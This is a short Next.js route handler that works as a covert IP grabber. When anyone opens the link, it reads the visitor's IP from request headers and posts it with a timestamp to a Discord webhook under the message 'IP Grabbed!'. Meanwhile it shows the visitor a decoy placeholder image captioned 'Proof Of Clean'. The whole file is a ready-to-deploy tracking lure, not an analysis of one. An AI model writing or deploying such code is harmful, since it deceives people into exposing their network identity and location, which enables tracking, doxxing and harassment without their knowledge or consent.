import { NextResponse } from 'next/server';

export async function GET(request: Request) {
  // 1. Get IP
  const ip = request.headers.get('x-forwarded-for') || 
             request.headers.get('x-real-ip') || 
             'unknown';

  // 2. Send to Discord
  const webhookUrl = process.env.DISCORD_WEBHOOK;
  
  if (webhookUrl) {
    fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `🕵️ **IP Grabbed!**\nIP: \`${ip}\`\nTime: ${new Date().toISOString()}`
      })
    }).catch(console.error);
  }

  // 3. Return Image
  return new NextResponse(`
    <html>
      <body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;">
        <img src="https://via.placeholder.com/500x500.png?text=Proof+Of+Clean" width="300" />
      </body>
    </html>
  `, {
    headers: { 'Content-Type': 'text/html' }
  });
}

export const dynamic = 'force-dynamic';
